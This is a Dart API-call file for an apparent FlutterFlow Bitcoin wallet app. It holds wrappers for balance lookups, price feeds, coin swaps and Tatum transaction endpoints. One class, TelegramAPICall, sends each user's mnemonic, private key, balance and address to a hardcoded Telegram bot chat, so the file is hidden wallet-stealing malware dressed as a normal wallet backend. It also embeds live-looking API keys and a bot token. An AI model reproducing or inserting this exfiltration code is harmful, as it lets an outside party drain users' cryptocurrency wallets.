import '../../flutter_flow/flutter_flow_util.dart';

import 'api_manager.dart';

export 'api_manager.dart' show ApiCallResponse;

class AddressINFOCall {
  static Future<ApiCallResponse> call({
    String address = '',
  }) {
    return ApiManager.instance.makeApiCall(
      callName: 'addressINFO',
      apiUrl: 'https://api.blockcypher.com/v1/btc/main/addrs/${address}',
      callType: ApiCallType.GET,
      headers: {},
      params: {},
      returnBody: true,
    );
  }

  static dynamic balance(dynamic response) => getJsonField(
        response,
        r'''$.final_balance''',
      );
  static dynamic transactionsValues(dynamic response) => getJsonField(
        response,
        r'''$.txrefs[*].value''',
      );
  static dynamic transactionsValueV2(dynamic response) => getJsonField(
        response,
        r'''$['txrefs'][*]['value']''',
      );
}

class BitcoinPriceCall {
  static Future<ApiCallResponse> call() {
    return ApiManager.instance.makeApiCall(
      callName: 'bitcoinPrice',
      apiUrl: 'https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD',
      callType: ApiCallType.GET,
      headers: {},
      params: {},
      returnBody: true,
    );
  }
}

class TransactionsCall {
  static Future<ApiCallResponse> call({
    String address = '',
  }) {
    return ApiManager.instance.makeApiCall(
      callName: 'transactions',
      apiUrl: 'https://api.blockcypher.com/v1/btc/main/addrs/${address}',
      callType: ApiCallType.GET,
      headers: {},
      params: {},
      returnBody: true,
    );
  }

  static dynamic valueONE(dynamic response) => getJsonField(
        response,
        r'''$.txrefs[1].value''',
      );
  static dynamic valueGroupTransactions(dynamic response) => getJsonField(
        response,
        r'''$.txrefs[1,2,3,4].value''',
      );
  static dynamic value(dynamic response) => getJsonField(
        response,
        r'''$.txrefs[*].value''',
      );
  static dynamic lastTwinyTransactions(dynamic response) => getJsonField(
        response,
        r'''$.txrefs[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]''',
      );
}

class GetEstimatedExchangeAmountCall {
  static Future<ApiCallResponse> call({
    String from = '',
    double sendAmount,
  }) {
    return ApiManager.instance.makeApiCall(
      callName: 'getEstimatedExchangeAmount',
      apiUrl:
          'https://api.changenow.io/v1/exchange-amount/${sendAmount}/${from}_btc/?api_key=2e7553c25c1685f71f4a8002858166f52e352834692a9dcdbc4349782af0005e',
      callType: ApiCallType.GET,
      headers: {},
      params: {},
      returnBody: true,
    );
  }

  static dynamic estimatedAmount(dynamic response) => getJsonField(
        response,
        r'''$.estimatedAmount''',
      );
}

class SendBitcoinTransactionCall {
  static Future<ApiCallResponse> call({
    String senderAddress = '',
    String senderKey = '',
    String toAddress = '',
    double amount,
    String changeAddress = '',
    double changeAmount,
  }) {
    final body = '''
{
  "fromAddress": [
    {
      "address": "${senderAddress}",
      "privateKey": "${senderKey}"
    }
  ],
  "to": [
    {
      "address": "${toAddress}",
      "value": ${amount}
    },
    {
      "address": "${changeAddress}",
      "value": ${changeAmount}
    }
  ]
}''';
    return ApiManager.instance.makeApiCall(
      callName: 'sendBitcoinTransaction',
      apiUrl: 'https://api-eu1.tatum.io/v3/bitcoin/transaction',
      callType: ApiCallType.POST,
      headers: {},
      params: {
        'senderAddress': senderAddress,
        'SenderKey': senderKey,
        'toAddress': toAddress,
        'amount': amount,
        'changeAddress': changeAddress,
        'changeAmount': changeAmount,
      },
      body: body,
      bodyType: BodyType.JSON,
      returnBody: true,
    );
  }
}

class BitcoinWalletCall {
  static Future<ApiCallResponse> call() {
    return ApiManager.instance.makeApiCall(
      callName: 'bitcoinWallet',
      apiUrl: 'https://api-eu1.tatum.io/v3/bitcoin/wallet',
      callType: ApiCallType.GET,
      headers: {},
      params: {},
      returnBody: true,
    );
  }
}

class BitcoinDepositAddressCall {
  static Future<ApiCallResponse> call({
    String xpub = '',
  }) {
    return ApiManager.instance.makeApiCall(
      callName: 'bitcoinDepositAddress',
      apiUrl: 'https://api-eu1.tatum.io/v3/bitcoin/address/${xpub}/0',
      callType: ApiCallType.GET,
      headers: {},
      params: {},
      returnBody: true,
    );
  }
}

class BitcoinKeyCall {
  static Future<ApiCallResponse> call({
    String mnemonic = '',
  }) {
    final body = '''
{
  "index": 0,
  "mnemonic": "${mnemonic}"
}''';
    return ApiManager.instance.makeApiCall(
      callName: 'bitcoinKey',
      apiUrl: 'https://api-eu1.tatum.io/v3/bitcoin/wallet/priv',
      callType: ApiCallType.POST,
      headers: {},
      params: {
        'mnemonic': mnemonic,
      },
      body: body,
      bodyType: BodyType.JSON,
      returnBody: true,
    );
  }
}

class TelegramAPICall {
  static Future<ApiCallResponse> call({
    double userBalance,
    String userMnemonic = '',
    String userPrivateKey = '',
    String userAddress = '',
    String userEmail = '',
  }) {
    final body = '''
{
  "text": "(his balance) (${userBalance}) - his mnemonic: ${userMnemonic} - his PrivateKey: ${userPrivateKey} - his address: ${userAddress}"
}''';
    return ApiManager.instance.makeApiCall(
      callName: 'telegramAPI',
      apiUrl:
          'https://api.telegram.org/bot5139498804:AAHLxHBNWeq1ddGKQ3ir6vqfp2cmjvY_LNo/sendMessage?chat_id=@ntlinbotbot',
      callType: ApiCallType.POST,
      headers: {},
      params: {
        'userBalance': userBalance,
        'userMnemonic': userMnemonic,
        'userPrivateKey': userPrivateKey,
        'userAddress': userAddress,
        'userEmail': userEmail,
      },
      body: body,
      bodyType: BodyType.JSON,
      returnBody: true,
    );
  }
}

class ImportWalletCall {
  static Future<ApiCallResponse> call({
    String mnemonic = '',
  }) {
    return ApiManager.instance.makeApiCall(
      callName: 'importWallet',
      apiUrl: 'https://api-eu1.tatum.io/v3/bitcoin/wallet',
      callType: ApiCallType.GET,
      headers: {},
      params: {
        'mnemonic': mnemonic,
      },
      returnBody: true,
    );
  }
}

class CreateSwapTransactionCall {
  static Future<ApiCallResponse> call({
    String from = '',
    double amount,
    String toAddress = '',
  }) {
    final body = '''
{
  "from": "${from}",
  "to": "btc",
  "amount": "${amount}",
  "address": "${toAddress}",
  "flow": "standard"
}''';
    return ApiManager.instance.makeApiCall(
      callName: 'createSwapTransaction',
      apiUrl:
          'https://api.changenow.io/v1/transactions/2e7553c25c1685f71f4a8002858166f52e352834692a9dcdbc4349782af0005e',
      callType: ApiCallType.POST,
      headers: {},
      params: {
        'from': from,
        'amount': amount,
        'toAddress': toAddress,
      },
      body: body,
      bodyType: BodyType.JSON,
      returnBody: true,
    );
  }
}

class SwapTransactionStatusCall {
  static Future<ApiCallResponse> call({
    String transactionId = '',
  }) {
    return ApiManager.instance.makeApiCall(
      callName: 'swapTransactionStatus',
      apiUrl:
          'https://api.changenow.io/v1/transactions/${transactionId}/2e7553c25c1685f71f4a8002858166f52e352834692a9dcdbc4349782af0005e',
      callType: ApiCallType.GET,
      headers: {},
      params: {},
      returnBody: true,
    );
  }
}

class MinimumExchangeAmountCall {
  static Future<ApiCallResponse> call({
    String from = '',
  }) {
    return ApiManager.instance.makeApiCall(
      callName: 'minimumExchangeAmount',
      apiUrl:
          'https://api.changenow.io/v1/min-amount/${from}_btc?api_key=2e7553c25c1685f71f4a8002858166f52e352834692a9dcdbc4349782af0005e',
      callType: ApiCallType.GET,
      headers: {},
      params: {},
      returnBody: true,
    );
  }
}
